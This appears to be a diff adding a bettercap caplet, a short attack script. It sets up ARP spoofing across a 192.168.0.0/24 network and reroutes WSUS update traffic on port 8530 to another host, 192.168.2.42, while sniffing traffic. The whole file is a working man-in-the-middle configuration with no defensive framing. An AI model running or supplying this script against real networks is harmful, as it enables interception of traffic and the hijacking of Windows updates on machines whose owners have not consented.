@@ -1,0 +1,23 @@
+# quick recon of the network
+net.probe on
+
+# set the ARP spoofing
+set arp.spoof.targets 192.168.0.0/24
+set arp.spoof.internal true
+set arp.spoof.fullduplex true
+
+# reroute traffic aimed at the WSUS server
+set any.proxy.iface eth0
+set any.proxy.protocol TCP
+set any.proxy.src_port 8530
+set any.proxy.dst_address 192.168.2.42
+set any.proxy.dst_port 8530
+
+# control logging and verbosity
+events.ignore endpoint
+events.ignore net.sniff
+
+# start the modules
+any.proxy on
+arp.spoof on
+net.sniff on
